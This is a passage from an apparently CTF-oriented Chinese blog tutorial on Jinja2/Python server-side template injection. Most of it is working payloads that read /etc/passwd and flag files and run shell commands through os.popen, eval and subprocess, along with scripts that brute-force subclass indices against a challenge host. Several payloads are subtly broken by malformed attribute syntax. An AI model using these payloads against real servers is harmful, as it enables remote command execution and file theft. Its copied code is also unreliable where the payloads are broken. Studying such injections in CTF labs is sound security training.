</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>119</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib_external</span><span class=o>.</span><span class=n>FileLoader</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>120</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib_external</span><span class=o>.</span><span class=n>_NamespacePath</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>121</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib_external</span><span class=o>.</span><span class=n>_NamespaceLoader</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>123</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib_external</span><span class=o>.</span><span class=n>FileFinder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=mi>125</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalEncoder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>125</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalEncoder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=mi>126</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalDecoder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>126</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalDecoder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=mi>127</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>StreamReaderWriter</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>127</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>StreamReaderWriter</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=mi>128</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>StreamRecoder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>128</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>StreamRecoder</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=mi>143</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>os</span><span class=o>.</span><span class=n>_wrap_close</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>popen</span> <span class=mi>143</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>os</span><span class=o>.</span><span class=n>_wrap_close</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>143</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>os</span><span class=o>.</span><span class=n>_wrap_close</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=mi>144</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>os</span><span class=o>.</span><span class=n>_AddedDllDirectory</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>popen</span> <span class=mi>144</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>os</span><span class=o>.</span><span class=n>_AddedDllDirectory</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>144</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>os</span><span class=o>.</span><span class=n>_AddedDllDirectory</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>145</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_sitebuiltins</span><span class=o>.</span><span class=n>Quitter</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>146</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_sitebuiltins</span><span class=o>.</span><span class=n>_Printer</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>148</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>types</span><span class=o>.</span><span class=n>DynamicClassAttribute</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>149</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>types</span><span class=o>.</span><span class=n>_GeneratorWrapper</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>150</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>WarningMessage</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>151</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>catch_warnings</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>174</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>operator</span><span class=o>.</span><span class=n>attrgetter</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>175</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>operator</span><span class=o>.</span><span class=n>itemgetter</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>176</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>operator</span><span class=o>.</span><span class=n>methodcaller</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>180</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>reprlib</span><span class=o>.</span><span class=n>Repr</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>191</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>functools</span><span class=o>.</span><span class=n>partialmethod</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>192</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>functools</span><span class=o>.</span><span class=n>singledispatchmethod</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>193</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>functools</span><span class=o>.</span><span class=n>cached_property</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>196</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>contextlib</span><span class=o>.</span><span class=n>_GeneratorContextManagerBase</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>197</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>contextlib</span><span class=o>.</span><span class=n>_BaseExitStack</span><span class=s1>&#39;&gt;</span>
</span></span></code></pre></div><p>Python 3 的利用点主要在 <code>__builtins__</code> 中 (通过 eval 导入模块), 方法同上</p><p>open 和 popen 也能利用</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># open</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>125</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>](</span><span class=s1>&#39;d:/test.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># popen</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>143</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;popen&#39;</span><span class=p>](</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span></code></pre></div><p><strong>Python3，file 类已经取消了，我们可以使用 <code>&lt;class '_frozen_importlib_external.FileLoader'></code>这个类来读取文件</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>79</span><span class=p>][</span><span class=s2>&#34;get_data&#34;</span><span class=p>](</span><span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;/etc/passwd&#34;</span><span class=p>)}}</span>
</span></span></code></pre></div><h3 id=判断-python-版本 class=headerLink><a href=#%e5%88%a4%e6%96%ad-python-%e7%89%88%e6%9c%ac class=header-mark></a>判断 Python 版本</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
</span></span></code></pre></div><p>Python 2 开头几行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;type&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;weakref&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;weakcallableproxy&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;weakproxy&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;int&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;basestring&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;bytearray&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;list&#39;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>......</span>
</span></span><span class=line><span class=cl> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>WarningMessage</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>warnings</span><span class=o>.</span><span class=n>catch_warnings</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_weakrefset</span><span class=o>.</span><span class=n>_IterationGuard</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_weakrefset</span><span class=o>.</span><span class=n>WeakSet</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Hashable</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=nb>classmethod</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Iterable</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Sized</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>......</span>
</span></span></code></pre></div><p>Python 3 开头几行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>type</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>async_generator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>int</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>bytearray_iterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>bytearray</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>bytes_iterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>bytes</span><span class=s1>&#39;&gt;...</span>
</span></span></code></pre></div><p>对比一下</p><p>Python 2 存在 <code>&lt;type xxx></code> 和 <code>&lt;class xxx></code>, 而 Python 3 只有 <code>&lt;class xxx></code></p><p>Python 3 有 <code>async_generator</code>, 虽然 asyncio 是 3.5 引入的, 不过也能作为一个判断依据</p><p>Python 3 有<code>bytes_iterator</code>, 因为 bytes 类型有改动, 与 Python 2 相差较大</p><h2 id=ssti常用注入模块利用 class=headerLink><a href=#ssti%e5%b8%b8%e7%94%a8%e6%b3%a8%e5%85%a5%e6%a8%a1%e5%9d%97%e5%88%a9%e7%94%a8 class=header-mark></a>SSTI常用注入模块利用</h2><h3 id=脚本查询模块 class=headerLink><a href=#%e8%84%9a%e6%9c%ac%e6%9f%a5%e8%af%a2%e6%a8%a1%e5%9d%97 class=header-mark></a>脚本查询模块</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter URL: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;{{().__class__.__base__.__subclasses__()[&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;]}}&#34;</span><span class=p>}</span>    <span class=c1>#name为网页传参变量名称</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;_frozen_importlib_external.FileLoader&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://644ac504-cb34-4a57-9364-fd881b516b31.challenge.ctf.show/?name={{().__class__.__base__.__subclasses__()[&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;]}}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;FileLoader&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>常用注入模块</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120373.jpeg title=9daef69614c6fef07daf37b71e72cf09_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120373.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120373.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120373.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120373.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120373.jpeg 2x" sizes=auto alt=9daef69614c6fef07daf37b71e72cf09_MD5></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120444.jpeg title=1be9ce8d3b29d5b48688654de22ecc77_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120444.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120444.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120444.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120444.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120444.jpeg 2x" sizes=auto alt=1be9ce8d3b29d5b48688654de22ecc77_MD5></a></figure></p><h3 id=文件读取 class=headerLink><a href=#%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96 class=header-mark></a>文件读取</h3><p>查找子类<code>_frozen_importlib_external.FileLoader</code></p><p><code>&lt;class '_frozen_importlib_external.FileLoader'></code></p><p>FileLoader 的利用</p><p><code>{{''.__class__.__mro__[1].__subclasses__()[79]["get_data"](0,"/etc/passwd")}}</code></p><p>读取<strong>配置文件</strong><code>**config**</code>下的FLAG</p><p><code>{{url_fo.__globals__['current_app'].config.FLAG}}</code></p><p><code>{{get_flashed_messages.__globals__['current_app'].config.FLAG}}</code></p><h3 id=eval命令执行 class=headerLink><a href=#eval%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c class=header-mark></a>eval命令执行</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter URL: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;{{().__class__.__base__.__subclasses__()[&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;].__init__.__globals__[&#39;__builtins__&#39;]}}&#34;</span><span class=p>}</span>    <span class=c1>#init初始化，builtins内建模块，python会加载内建模块中的函数到内存中</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;eval&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>            <span class=c1>#查找哪一个模块下有 eval</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><p>常见的含有 eval 函数的类：</p><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li></ul><p><code>{{''.__class__.__bases[0]__.__subclasses__()[65].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}</code></p><h3 id=os模块 class=headerLink><a href=#os%e6%a8%a1%e5%9d%97 class=header-mark></a>os模块</h3><p>os 模块中有 system 和 popen 两个函数可以用于执行命令，其中 system 函数没有回显，我们需要配合 curl 来外带数据或者反弹 shell，popen 函数执行命令有回显，因此如果可以使用 popen 函数的话我们会优先使用这个</p><p><code>{{''.__class__.__base__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls /").read()}}</code></p><h3 id=importlilb模块 class=headerLink><a href=#importlilb%e6%a8%a1%e5%9d%97 class=header-mark></a>importlilb模块</h3><p>在 python 中，存在类 <code>&lt;class '_frozen_importlib.BuiltinImporter'></code>，其中可以提供 python 中的 import 语句，如此一来，我们可以利用该类中的 <code>load_module</code> 将 os 模块导入，使用 os 模块来执行命令</p><p><code>{{''.__class__.__base__[0].__subclasses__()[69]["load_module"]("os")["popen"]("ls -l /opt").read()}}</code></p><h3 id=linecache模块 class=headerLink><a href=#linecache%e6%a8%a1%e5%9d%97 class=header-mark></a>linecache模块</h3><p>linecache 用于读取任意文件的某一行，这个函数中也引入了 os 模块，因此我们也可以利用这个函数去执行命令</p><p><code>{{''.__class__.__base__.__subclasses__()[191].__init__.__globals__['os'].popen("ls -l /opt").read()}}</code></p><h3 id=subprocesspopen类 class=headerLink><a href=#subprocesspopen%e7%b1%bb class=header-mark></a>subprocess.Popen类</h3><p>从 python 2.4 开始，可以使用 subprocess 这个模块来产生子进程，并且连接到子进程的标准输入/输出/错误中，还可以得到子进程的返回值</p><p>subprocess 用于替代其他几个老的模块或者函数，比如 os.system，os.open 等首先遍历含有 linecache 这个函数的子类的索引号</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://47.xxx.xxx.72:8000/?name= {{().__class__.__bases__[0].__subclasses__()[&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;]}}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;linecache&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span></code></pre></div><p><code>{{''.__class__.__base__.__subclasses__()[200].('ls /',shell=True,stdout=-1).communicate()[0].strip()}}</code></p><p><strong>例题（重庆橘子科技SSTILAB——jinja2模板注入）</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120696.jpeg title=44f44ddb9ba83039c498eb19442a783a_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120696.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120696.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120696.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120696.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120696.jpeg 2x" sizes=auto alt=44f44ddb9ba83039c498eb19442a783a_MD5></a></figure></p><p>查看所有子类发现<code>os._wrap_close</code>在第118个所以构造语句</p><p><code>{{''.__class__.__base__.__subclasses__()[117].__init__}}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120776.jpeg title=46c4bf7c07799fcf616235e1e85c244f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120776.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120776.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120776.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120776.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120776.jpeg 2x" sizes=auto alt=46c4bf7c07799fcf616235e1e85c244f_MD5></a></figure></p><p>发现没有出现wrapper 字样，说明已经重载可以被利用</p><p><code>{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}</code></p><p>看看全局变量有哪些函数可以直接利用</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120029.jpeg title=f23b49e1300bf62a765f1a648b10d807_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120029.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120029.jpeg 